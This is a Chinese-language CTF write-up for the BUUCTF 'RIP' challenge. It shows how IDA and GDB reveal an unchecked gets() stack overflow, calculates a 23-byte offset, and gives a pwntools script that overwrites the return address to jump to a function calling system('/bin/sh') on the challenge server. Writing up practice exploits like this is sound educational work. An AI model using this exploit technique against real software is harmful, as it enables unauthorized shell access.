# RIP

## 分析程序

### IDA 分析

使用 IDA 反编译程序，得到下图；然后 可以分析知道，该程序 即简单的输入，然后输出；**由于`gets()`没有对输入做边界检查所以存在栈溢出的可能**

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-05_19-37-49.png)

`F5`得到C语言代码，如下所示：

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-05_19-38-04.png)

进一步查看栈的情况：

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-05_19-42-44.png)

由此可以知道，输入到返回地址差距为 **23个字节**；进一步查看，发现该函数中存在 `fun`函数调用了`system("/bin/sh")`;所以我们需要在返回地址覆盖`fun`函数的起始地址，即`0x401186`如下所示

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-05_19-44-27.png)





### GDB 分析

首先是 使用`gdb`调试

```shell
gdb pwn1  ## gdb 加载pwn1
info function  #查看该程序中有的函数信息
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-05_19-49-46.png)

```shell
disass main #查看 main 函数的汇编代码
disass fun  #查看 fun 函数的汇编代码
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-05_19-51-03.png)



通过 分析汇编代码画出堆栈图得到 栈溢出偏移值 为23



## 堆栈图

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-09-05_20-05-05.png)

## Payload

```python
from pwn import *

#io = process("/home/always/Desktop/pwn1")
io = remote("node4.buuoj.cn","29681")

payload = 23*b"A" + p64(0x401187)

io.sendline(payload)

io.interactive()
```

